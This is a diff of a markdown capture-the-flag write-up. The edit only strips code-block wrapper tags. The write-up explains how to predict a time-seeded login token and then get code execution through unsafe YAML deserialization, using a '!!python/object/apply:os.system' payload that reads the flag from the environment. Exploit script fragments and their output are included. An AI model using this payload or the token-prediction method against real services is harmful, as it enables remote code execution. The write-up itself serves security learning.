@@ -41,7 +41,6 @@ First thing to note is the server imports `yaml` and `jinja2`, this should make 
     -   An `update()` function is called on the firmware object
 -   Finally, the template is rendered
 
-{% code overflow="wrap" %}
 ```python
 def main():
     tokenRoot = genToken(int(time.time()) // 1)
@@ -62,23 +61,19 @@ def main():
 
     print( template.render(access=access) )
 ```
-{% endcode %}
 
 We'll want to know how the token is generated, since this is the first hurdle to overcome.
 
-{% code overflow="wrap" %}
 ```python
 def genToken(seed:str) -> str:
     random.seed(seed)
     return ''.join(random.choices('abcdef0123456789', k=16))
 ```
-{% endcode %}
 
 It makes a 16-char hex string using the seed (current time epoch). Obviously the current time is predictable, so this is a weak implementation, we'll bare this in mind for later.
 
 Finally, on the server-side we have the `Firmware` class, this is the object that will be created from our YAML config (if we get the token right).
 
-{% code overflow="wrap" %}
 ```python
 class Firmware():
     def __init__(self, version:str):
@@ -87,23 +82,18 @@ class Firmware():
     def update(self):
         pass
 ```
-{% endcode %}
 
 So, where is the flag? We need to also check the challenge setup code, and will find the flag is in an environment variable.
 
-{% code overflow="wrap" %}
 ```python
 os.environ["FLAG"] = flag
 ```
-{% endcode %}
 
 I'll not go through the rest of the code, but note that a `model` variable is rendered but not actually defined anywhere in the challenge.
 
-{% code overflow="wrap" %}
 ```html
 <span>Camera Id: 1<b>{{ model }}</b></span>
 ```
-{% endcode %}
 
 ### Testing functionality
 
@@ -119,7 +109,6 @@ To test this I checked the HTTP request in burp and saw the POST params are `tok
 
 Then, we generate a token using the same process as the server. There can be some timing issues here so I used a script that would run 5 times, incrementing the time by 1 second until it matches. Note that there is some rate-limiting so we add a slight delay between attempts.
 
-{% code overflow="wrap" %}
 ```python
 import random
 import time
@@ -189,11 +178,9 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         pass
 ```
-{% endcode %}
 
 Run the script and we see the token will match.
 
-{% code overflow="wrap" %}
 ```bash
 [+] drift (server-client): +2 s
 [*] try 01: seed 1752675554, token 3bf4703ace4ece6b
@@ -202,7 +189,6 @@ Run the script and we see the token will match.
 
 [+] token accepted!
 ```
-{% endcode %}
 
 ### Exploit 2: YAML Deserialization
 
@@ -210,15 +196,12 @@ Now we need to exploit the YAML deserialization. I wasted an embarrassing amount
 
 Note that the server code requires a `firmware` element.
 
-{% code overflow="wrap" %}
 ```python
 firmware = Firmware(**data["firmware"])
 ```
-{% endcode %}
 
 We also need a version element, and we'll replace the `update` function with the code we want to execute.
 
-{% code overflow="wrap" %}
 ```python
 class Firmware():
     def __init__(self, version:str):
@@ -227,22 +210,18 @@ class Firmware():
     def update(self):
         pass
 ```
-{% endcode %}
 
 Putting that all together, I used a YAML payload like:
 
-{% code overflow="wrap" %}
 ```yaml
 firmware:
     version: "meow"
     update: !!python/object/apply:os.system
         - "cat $FLAG"
 ```
-{% endcode %}
 
 Tying this altogether, we will generate our token and then submit the RCE payload with the following PoC. It can also be a good idea to add a proxy option so that you can review request/response in burp suite for debugging purposes.
 
-{% code overflow="wrap" %}
 ```python
 import random
 import time
@@ -340,11 +319,9 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         pass
 ```
-{% endcode %}
 
 We run the exploit script and receive the flag 😎
 
-{% code overflow="wrap" %}
 ```bash
 [+] drift (server-client): +3 s
 [*] try 01: seed 1752676034, token edc16546af256495
@@ -352,7 +329,6 @@ We run the exploit script and receive the flag 😎
 
 [✓] FLAG → FLAG{M4lware_F1rmw4r3_N0t_F0und}
 ```
-{% endcode %}
 
 🚩Flag: `FLAG{M4lware_F1rmw4r3_N0t_F0und}`
 
